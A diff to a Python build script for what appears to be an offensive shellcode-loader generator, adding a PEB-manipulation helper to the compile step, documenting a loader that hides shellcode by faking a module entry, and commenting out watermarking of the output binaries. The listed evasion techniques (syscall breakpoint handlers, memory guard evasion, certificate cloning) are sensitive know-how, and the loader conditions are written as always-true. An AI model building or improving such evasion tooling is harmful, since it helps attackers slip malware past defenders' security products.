@@ -643,6 +643,7 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         except subprocess.CalledProcessError as e:
             print(f"[-] NASM assembly compilation failed: {e}")
             return  # Exit the function if NASM compilation fails
+    
 
     output_dir = os.path.dirname(output_name)
     if not os.path.exists(output_dir):
@@ -746,6 +747,9 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
     if loader_number == 1 or 39 or 40 or 41:
         compile_command.append('assembly.o')
         compile_command.append('-luuid')
+    if loader_number == 37 or 38 or 48 or 49 or 51 or 52 or 56:
+        compile_command.append('./evader/pebutils.c')
+        
 
     try:
         subprocess.run(compile_command, check=True)
@@ -1018,6 +1022,7 @@ def main():
     52. RoP gadgets as the trampoline code to execute the magic code. 
     53.
     54. Stealth new loader + Exception handler + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk, with Decoy address, PAGE_NOACCESS and XOR)
+    56. This is a fork of Loader 37 with additional features. If -ldr flag is not provided, loader will add module (contains the shellcode) to the PEB module lists manually using code from Dark library. 
     """
 
     def check_non_negative(value):
@@ -1218,9 +1223,9 @@ def main():
         strip_binary(output_file_path)
 
     ## Add watermark to the binary:
-    args.watermark = bool(args.watermark)
-    if args.watermark:
-        add_watermark(output_file_path)
+    # args.watermark = bool(args.watermark)
+    # if args.watermark:
+    #     add_watermark(output_file_path)
 
 
     def sign_with_carbon_copy(website, output_file_path, signed_output_file_path):
